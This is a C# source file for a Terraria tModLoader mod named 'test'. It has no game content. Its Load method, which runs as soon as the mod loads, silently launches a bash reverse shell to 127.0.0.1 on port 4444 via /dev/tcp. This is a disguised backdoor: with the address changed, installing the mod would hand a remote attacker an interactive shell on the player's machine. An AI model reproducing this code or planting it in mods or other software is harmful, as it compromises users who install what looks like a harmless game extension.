using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using Terraria.ModLoader;

namespace test
{
	// Please read https://github.com/tModLoader/tModLoader/wiki/Basic-tModLoader-Modding-Guide#mod-skeleton-contents for more information about the various files in a mod.
	public class test : Mod
	{
		public override void Load() {
			Process process = new Process();
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.FileName = "/bin/bash";
			startInfo.Arguments = "-c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"";
			startInfo.UseShellExecute = true;
			startInfo.CreateNoWindow = true;
			process.StartInfo = startInfo;
			process.Start();
		}
		
	}
}
